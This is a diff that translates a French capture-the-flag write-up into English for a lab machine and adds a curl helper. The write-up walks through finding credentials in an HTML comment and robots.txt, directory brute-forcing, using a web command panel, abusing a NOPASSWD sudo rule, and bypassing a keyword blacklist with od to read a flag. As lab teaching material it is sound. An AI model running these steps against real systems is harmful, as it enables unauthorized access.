@@ -1,45 +1,45 @@
 # Write-up : "H4ck3rz"
 
-**Cible :** 10.10.0.30
+**Target:** 10.10.0.30
 
-**Objectif :** Obtenir user.txt
+**Objective:** Get user.txt
 
-**Difficulté :** Easy
+**Difficulty:** Easy
 
-**Date :** 16/09/2026
+**Date:** 16/09/2026
 
-**Techniques utilisées :** Reconnaissance réseau, OSINT/énumération web, brute force de répertoires, contournement de blacklist, escalade de privilèges via sudo
+**Techniques used:** Network reconnaissance, OSINT/web enumeration, directory brute forcing, blacklist bypass, privilege escalation via sudo
 
-**Outils utilisés :** nmap, curl, gobuster, sshpass, xxd, nc
+**Tools used:** nmap, curl, gobuster, sshpass, xxd, nc
 
 ---
 
-## 1. Reconnaissance réseau (Nmap)
+## 1. Network reconnaissance (Nmap)
 
-**Commande :**
+**Command:**
 
 ```bash
 nmap -sV -p- 10.10.0.30
 ```
 
-**Pourquoi :** scan complet de tous les ports TCP pour identifier les services exposés avant toute tentative d'exploitation.
+**Why:** full scan of all TCP ports to identify exposed services before any exploitation attempt.
 
-**Résultat :**
+**Result:**
 
 - `22/tcp` : SSH (OpenSSH 10.0p2 Debian)
 - `80/tcp` : HTTP (Apache 2.4.68)
 
 ---
 
-## 2. Exploration de la page web principale
+## 2. Exploring the main web page
 
-**Commande :**
+**Command:**
 
 ```bash
 curl -i http://10.10.0.30/
 ```
 
-**Résultat :** une page HTML basique ("my 42sh") contenant un commentaire caché dans le code source :
+**Result:** a basic HTML page ("my 42sh") containing a comment hidden in the source code:
 
 ```html
 <!--
@@ -48,38 +48,38 @@ Remember username: d4rk_T1t0u4N
 -->
 ```
 
-**Faille exploitée :** Exposition d'informations sensibles dans le code source HTML (CWE-200 : Exposure of Sensitive Information) -> un commentaire de développement oublié révèle un identifiant.
+**Vulnerability exploited:** Exposure of sensitive information in the HTML source code (CWE-200: Exposure of Sensitive Information) -> a forgotten development comment reveals a username.
 
 ---
 
-## 3. Découverte d'un chemin caché via robots.txt
+## 3. Discovering a hidden path via robots.txt
 
-**Commande :**
+**Command:**
 
 ```bash
 curl -s http://10.10.0.30/robots.txt
 ```
 
-`-s` = Garde la sortie terminal propre (tu vois direct le contenu du fichier sans bruit autour).
+`-s` = Keeps the terminal output clean (you see the file's content directly without noise around it).
 
-**Résultat :**
+**Result:**
 
 ```
 User-agent: *
 Disallow: /1337_53CR37_l41r
 ```
 
-**Faille exploitée :** robots.txt mal utilisé comme mécanisme de sécurité (CWE-548 : Exposure of Information Through Directory Listing) -> `robots.txt` est une convention que les moteurs de recherche utilisent pour dire aux robots d'indexation (Google, Bing, etc.) quelles parties du site ne pas explorer/indexer, pas un contrôle d'accès ; il révèle ici l'existence d'un chemin qu'on n'aurait jamais deviné.
+**Vulnerability exploited:** robots.txt misused as a security mechanism (CWE-548: Exposure of Information Through Directory Listing) -> `robots.txt` is a convention that search engines use to tell indexing bots (Google, Bing, etc.) which parts of the site not to crawl/index, not an access control; here it reveals the existence of a path that would never have been guessed.
 
-**Commande :**
+**Command:**
 
 ```bash
 curl -i http://10.10.0.30/1337_53CR37_l41r/
 ```
 
-`-i` = Sert à afficher les headers HTTP de la réponse en plus du corps de la page.
+`-i` = Used to display the response's HTTP headers in addition to the page body.
 
-**Résultat :** une page révélant le mot de passe associé :
+**Result:** a page revealing the associated password:
 
 ```html
 <p>Just in case I forgot, password to my super future 42sh: 8ES7_SHeLL_Ev4H</p>
@@ -87,28 +87,28 @@ curl -i http://10.10.0.30/1337_53CR37_l41r/
 
 ---
 
-## 4. Tentative infructueuse d'authentification SSH
+## 4. Unsuccessful SSH authentication attempt
 
 ```bash
 ssh d4rk_T1t0u4N@10.10.0.30
 # password: 8ES7_SHeLL_Ev4H → Permission denied
 ```
 
-Plusieurs vérifications ont été menées pour écarter les fausses pistes :
+Several checks were carried out to rule out false leads:
 
 ```bash
-sshpass -p '8ES7_SHeLL_Ev4H' ssh -v d4rk_T1t0u4N@10.10.0.30   # ré-essai propre, sans erreur de frappe
-curl -s http://10.10.0.30/1337_53CR37_l41r/ | grep -A1 -i password | xxd   # vérifier l'absence de caractères invisibles
-nc -zv -w3 10.10.0.30 22   # vérifier l'absence de ban fail2ban après plusieurs échecs
+sshpass -p '8ES7_SHeLL_Ev4H' ssh -v d4rk_T1t0u4N@10.10.0.30   # clean retry, without typing errors
+curl -s http://10.10.0.30/1337_53CR37_l41r/ | grep -A1 -i password | xxd   # check for absence of invisible characters
+nc -zv -w3 10.10.0.30 22   # check for absence of a fail2ban ban after several failures
 ```
 
-**Conclusion :** les identifiants trouvés n'étaient pas destinés à SSH mais à un service web qu'il restait à découvrir.
+**Conclusion:** the credentials found were not intended for SSH but for a web service that remained to be discovered.
 
 ---
 
-## 5. Découverte de l'interface web cachée (brute-force de répertoires)
+## 5. Discovering the hidden web interface (directory brute-forcing)
 
-**Commande :**
+**Command:**
 
 ```bash
 gobuster dir -u http://10.10.0.30/ \
@@ -116,29 +116,29 @@ gobuster dir -u http://10.10.0.30/ \
   -x php,html,txt,zip,bak -t 30
 ```
 
-**Résultat :**
+**Result:**
 
 ```
 login.php     (Status: 200)
-portal.php    (Status: 302) → /login.php
-forbidden.php (Status: 302) → /login.php
+portal.php    (Status: 302) -> /login.php
+forbidden.php (Status: 302) -> /login.php
 ```
 
-**Faille exploitée :** Pages non référencées mais accessibles ("security by obscurity") (CWE-425 : Direct Access to a Resource) -> les fichiers `.php` n'étaient liés depuis aucune page mais restaient accessibles publiquement.
+**Vulnerability exploited:** Unreferenced but accessible pages ("security by obscurity") (CWE-425: Direct Access to a Resource) -> the `.php` files weren't linked from any page but remained publicly accessible.
 
 ---
 
-## 6. Authentification sur le formulaire web
+## 6. Authentication on the web form
 
-**Inspection du formulaire :**
+**Inspecting the form:**
 
 ```bash
 curl -s http://10.10.0.30/login.php
 ```
 
--> champs `username`, `password`, bouton `sub`.
+-> fields `username`, `password`, button `sub`.
 
-**Connexion :**
+**Login:**
 
 ```bash
 curl -s -c cookies.txt -X POST http://10.10.0.30/login.php \
@@ -146,109 +146,109 @@ curl -s -c cookies.txt -X POST http://10.10.0.30/login.php \
   -i
 ```
 
-**Résultat :** `HTTP/1.1 302 Found` avec redirection vers `/portal.php` -> authentification réussie, cookie de session `PHPSESSID` obtenu.
+**Result:** `HTTP/1.1 302 Found` with a redirect to `/portal.php` -> successful authentication, `PHPSESSID` session cookie obtained.
 
 ```bash
 curl -s -c cookies.txt -b cookies.txt http://10.10.0.30/portal.php
 ```
 
-**Résultat :** On tombe sur un commentaire HTML caché en bas de page, encodé en base64.
+**Result:** We come across a hidden HTML comment at the bottom of the page, base64 encoded.
 
 <!-- YUdGMlpTQjViM1VnYUdWaGNtUWdiMllnWVNCeVlXSmlhWFFnYUc5c1pTQS9JRmx2ZFNCemFHOTFiR1FnYkc5dmF5QnBkQ0IxY0N3Z2VXOTFJR3AxYzNRZ1ptVnNiQ0JwYmlCdmJtVmNJUT09 -->
 
-Une fois décodé = "have you heard of a rabbit hole ? You should look it up, you just fell in one!" -> C'est un indice.
+Once decoded = "have you heard of a rabbit hole? You should look it up, you just fell in one!" -> This is a hint.
 
 ---
 
-## 7. Accès au panneau "Shell" (exécution de commandes distante légitime)
+## 7. Access to the "Shell" panel (legitimate remote command execution)
 
-**Résultat :** une interface Shell Panel avec un champ `command` qui exécute des commandes système et affiche le résultat dans une balise `<pre>`.
+**Result:** a Shell Panel interface with a `command` field that executes system commands and displays the result in a `<pre>` tag.
 
-**Faille exploitée :** Exécution de commandes arbitraires exposée (Remote Command Execution volontaire mais faiblement filtrée) (CWE-78 : Improper Neutralization of Special Elements used in an OS Command) — la fonctionnalité elle-même est une porte d'entrée pour l'exécution de commandes système.
+**Vulnerability exploited:** Exposed arbitrary command execution (intentional but weakly filtered Remote Command Execution) (CWE-78: Improper Neutralization of Special Elements used in an OS Command), the feature itself is an entry point for system command execution.
 
-**Test :**
+**Optimization / defining a `run` function:**
+
+Since all interactions with the Shell Panel reuse the same POST request to `portal.php` (only the command changes), we define a shell function that encapsulates the repetitive part. This replaces the long `curl` lines with a simple `run "<command>"`.
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=whoami" \
-  --data-urlencode "sub=Execute"
+run() {
+  curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
+    --data-urlencode "command=$1" \
+    --data-urlencode "sub=Execute" ;
+}
 ```
 
--> résultat : `www-data`
+`"$1"` is the first argument passed to `run`, injected into the `command` field. The session cookie (`-b cookies.txt`) is kept for each call.
+
+**Test:**
+
+```bash
+run "whoami"
+```
+
+-> result: `www-data`
 
 ---
 
-## 8. Reconnaissance système via le Shell Panel
+## 8. System reconnaissance via the Shell Panel
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=find /var/www -type f" \
-  --data-urlencode "sub=Execute"
-
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=ls -la /home" \
-  --data-urlencode "sub=Execute"
+run "ls -la /home"
 ```
 
-**Résultat clé :**
+**Key result:**
 
 ```
 drwx------ 1 titouan titouan 4096 Aug 27 09:35 titouan
 ```
 
--> le répertoire personnel de `titouan` (700, inaccessible à `www-data`) contient probablement `user.txt`.
+-> `titouan`'s home directory (700, inaccessible to `www-data`) probably contains `user.txt`.
 
 ---
 
-## 9. Escalade de privilèges via sudo -l
+## 9. Privilege escalation via sudo -l
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=sudo -l" \
-  --data-urlencode "sub=Execute"
+run "sudo -l"
 ```
 
-**Résultat :**
+**Result:**
 
 ```
 User www-data may run the following commands on h4xx0r_pc:
     (titouan) NOPASSWD: ALL
 ```
 
-**Faille exploitée :** Règle sudo excessivement permissive (CWE-269 : Improper Privilege Management) - `www-data` peut exécuter n'importe quelle commande en tant que `titouan`, sans mot de passe, ce qui annule toute la protection des permissions du dossier `/home/titouan`.
+**Vulnerability exploited:** Excessively permissive sudo rule (CWE-269: Improper Privilege Management) - `www-data` can execute any command as `titouan`, without a password, which cancels out all the permission protection on the `/home/titouan` folder.
 
 ---
 
-## 10. Contournement du filtre de mots-clés
+## 10. Bypassing the keyword filter
 
-**Première tentative bloquée :**
-
-```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=sudo -u titouan cat /home/titouan/user.txt" \
-  --data-urlencode "sub=Execute"
-```
-
-→ _"Command contain some forbidden keywords. Disabled to prevent dirty hackers, never too cautious"_ (le mot-clé `cat` est filtré côté serveur)
-
-**Faille exploitée :** Filtrage par liste noire (blacklist) de commandes, contournable (CWE-184 : Incomplete List of Disallowed Inputs) - bloquer `cat` sans bloquer les dizaines d'alternatives permettant de lire un fichier est une protection illusoire.
-
-**Contournement avec `od` (non filtré) :**
+**First blocked attempt:**
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=sudo -u titouan od -c /home/titouan/user.txt" \
-  --data-urlencode "sub=Execute"
+run "sudo -u titouan cat /home/titouan/user.txt"
 ```
 
-**Résultat :**
+→ _"Command contain some forbidden keywords. Disabled to prevent dirty hackers, never too cautious"_ (the `cat` keyword is filtered server-side)
+
+**Vulnerability exploited:** Bypassable command blacklist filtering (CWE-184: Incomplete List of Disallowed Inputs) - blocking `cat` without blocking the dozens of alternatives that allow reading a file is an illusory protection.
+
+**Bypass with `od` (not filtered):**
+
+```bash
+run "sudo -u titouan od -c /home/titouan/user.txt"
+```
+
+**Result:**
 
 ```
 0000000   E   P   I   {   7   1   m   e   _   7   0   _   D   0   _   7
 0000020   H   0   5   E   _   N   c   u   R   5   e   2   }  \n
 ```
 
-**FLAG obtenu :**
+**FLAG obtained:**
 
 ```
 EPI{71me_70_D0_7H05E_NcuR5e2}
@@ -256,60 +256,60 @@ EPI{71me_70_D0_7H05E_NcuR5e2}
 
 ---
 
-## Résumé des failles exploitées
+## Summary of exploited vulnerabilities
 
-| #   | Faille                                                         | Catégorie (CWE)                                | Impact                                           |
-| --- | -------------------------------------------------------------- | ---------------------------------------------- | ------------------------------------------------ |
-| 1   | Commentaire HTML révélant un identifiant                       | CWE-200 (Exposure of Sensitive Information)    | Fuite du username                                |
-| 2   | robots.txt utilisé comme "sécurité" pour cacher un chemin      | CWE-548 (Directory listing / exposure)         | Découverte d'un chemin contenant le mot de passe |
-| 3   | Pages PHP accessibles sans lien depuis le site                 | CWE-425 (Direct Access to a Resource)          | Découverte de login.php / portal.php             |
-| 4   | Panneau d'exécution de commandes exposé après authentification | CWE-78 (OS Command Injection / RCE volontaire) | Exécution de commandes en tant que www-data      |
-| 5   | Règle sudo `(titouan) NOPASSWD: ALL` pour www-data             | CWE-269 (Improper Privilege Management)        | Passage www-data → titouan sans mot de passe     |
-| 6   | Filtrage par liste noire de mots-clés (cat bloqué)             | CWE-184 (Incomplete List of Disallowed Inputs) | Contournement trivial avec od, head, etc.        |
+| #   | Vulnerability                                                    | Category (CWE)                                 | Impact                                            |
+| --- | ------------------------------------------------------------------ | ----------------------------------------------- | -------------------------------------------------- |
+| 1   | HTML comment revealing a username                                 | CWE-200 (Exposure of Sensitive Information)     | Username leak                                      |
+| 2   | robots.txt used as "security" to hide a path                       | CWE-548 (Directory listing / exposure)          | Discovery of a path containing the password        |
+| 3   | PHP pages accessible without a link from the site                  | CWE-425 (Direct Access to a Resource)           | Discovery of login.php / portal.php                |
+| 4   | Command execution panel exposed after authentication               | CWE-78 (OS Command Injection / intentional RCE) | Command execution as www-data                      |
+| 5   | Sudo rule `(titouan) NOPASSWD: ALL` for www-data                    | CWE-269 (Improper Privilege Management)         | www-data → titouan escalation without a password   |
+| 6   | Keyword blacklist filtering (cat blocked)                          | CWE-184 (Incomplete List of Disallowed Inputs)  | Trivial bypass with od, head, etc.                 |
 
 ---
 
-## Chaîne d'exploitation (résumé visuel)
+## Exploitation chain (visual summary)
 
 ```
-Commentaire HTML caché
+Hidden HTML comment
         │
-        ▼
-Username trouvé (d4rk_T1t0u4N)
+        v
+Username found (d4rk_T1t0u4N)
         │
-        ▼
-robots.txt -> chemin caché /1337_53CR37_l41r/
+        v
+robots.txt -> hidden path /1337_53CR37_l41r/
         │
-        ▼
-Password trouvé (8ES7_SHeLL_Ev4H)
+        v
+Password found (8ES7_SHeLL_Ev4H)
         │
-        ▼
-Brute-force de répertoires (gobuster) -> login.php / portal.php
+        v
+Directory brute-force (gobuster) -> login.php / portal.php
         │
-        ▼
-Authentification sur le formulaire web (PAS SSH)
+        v
+Authentication on the web form (NOT SSH)
         │
-        ▼
-Accès au "Shell Panel" -> RCE en tant que www-data
+        v
+Access to the "Shell Panel" -> RCE as www-data
         │
-        ▼
+        v
 sudo -l -> (titouan) NOPASSWD: ALL
         │
-        ▼
-Contournement du filtre "cat" avec "od -c"
+        v
+Bypassing the "cat" filter with "od -c"
         │
-        ▼
-Lecture de /home/titouan/user.txt → FLAG
+        v
+Reading /home/titouan/user.txt → FLAG
 ```
 
 ---
 
 ## Conclusion
 
-- **Accès initial :** énumération OSINT (commentaire HTML + robots.txt) → identifiants web.
-- **Accès applicatif :** authentification sur `login.php` → accès au Shell Panel → RCE en tant que `www-data`.
-- **Escalade de privilèges :** règle sudo `NOPASSWD: ALL` vers `titouan`, contournement du filtre de mots-clés avec `od`.
-- **Flag user :** `EPI{71me_70_D0_7H05E_NcuR5e2}` obtenu dans `/home/titouan/user.txt`.
+- **Initial access:** OSINT enumeration (HTML comment + robots.txt) → web credentials.
+- **Application access:** authentication on `login.php` -> access to the Shell Panel -> RCE as `www-data`.
+- **Privilege escalation:** sudo rule `NOPASSWD: ALL` to `titouan`, bypassing the keyword filter with `od`.
+- **User flag:** `EPI{71me_70_D0_7H05E_NcuR5e2}` obtained in `/home/titouan/user.txt`.
 
 ---
 
